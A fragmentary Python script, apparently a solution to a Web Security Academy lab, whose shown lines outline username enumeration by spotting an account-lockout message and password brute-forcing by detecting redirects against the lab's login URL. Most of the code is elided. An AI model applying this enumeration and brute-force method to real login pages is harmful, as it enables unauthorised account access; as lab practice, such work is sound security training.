    ...
    for x in range(0, 4):
        ...
        for index, user in enumerate(usernames):
            ...
            if response.status_code == 200:
                # search for pattern
                check_pattern = re.findall("You have made too many incorrect login attempts", response.text)  
...
def brute_force_password(start_time, url, valid_user, passwords):
    ...
    for (index, password) in enumerate(passwords):
        ...
        # if a redirect occurred, it indicates a valid password
...
url = "https://0a6800cc0418fac382996f4d00f00019.web-security-academy.net/login"
